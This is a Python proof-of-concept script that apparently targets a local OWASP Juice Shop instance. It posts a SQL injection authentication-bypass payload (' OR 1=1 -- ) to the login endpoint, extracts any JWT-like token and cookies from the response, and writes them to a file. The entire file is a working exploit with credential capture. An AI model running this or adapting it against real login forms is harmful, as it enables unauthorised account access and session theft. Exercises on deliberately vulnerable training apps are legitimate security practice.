import requests
from urllib.parse import urljoin

BASE = "http://localhost:3000"
LOGIN = "/rest/user/login"
PAYLOAD = "' OR 1=1 -- "
OUT = "captured_auth.txt"

def post_and_check(base):
    url = urljoin(base, LOGIN)
    s = requests.Session()
    s.headers.update({"User-Agent": "JuiceShopPoC/1.0"})
    body = {"email": PAYLOAD, "password": "x"}
    try:
        r = s.post(url, json=body, timeout=8)
    except Exception as e:
        print("Request error:", e)
        return None
    print("HTTP", r.status_code)
    snippet = (r.text or "")[:800].replace("\n", " ")
    print("Body snippet:", snippet)
    cookies = r.cookies.get_dict()
    if cookies:
        print("Cookies:", cookies)
    # quick JWT check
    token = None
    if "eyJ" in (r.text or ""):
        i = r.text.find("eyJ")
        token = r.text[i:i+500].split()[0]
        print("Found JWT-like:", token[:80], "...")
    return {"resp": r, "cookies": cookies, "token": token, "body": snippet}

def main():
    res = post_and_check(BASE)
    if not res:
        return
    if res["token"] or res["cookies"]:
        with open(OUT, "w", encoding="utf-8") as fh:
            fh.write(f"Target: {BASE}\n\n")
            fh.write("Cookies:\n" + str(res["cookies"]) + "\n\n")
            if res["token"]:
                fh.write("Token:\n" + res["token"] + "\n\n")
            fh.write("Body snippet:\n" + res["body"] + "\n")
        print(f"Saved capture to {OUT}")
    else:
        print("No token or cookies detected. Try inspecting the login request in the browser and adjust LOGIN or payload.")

if __name__ == "__main__":
    main()
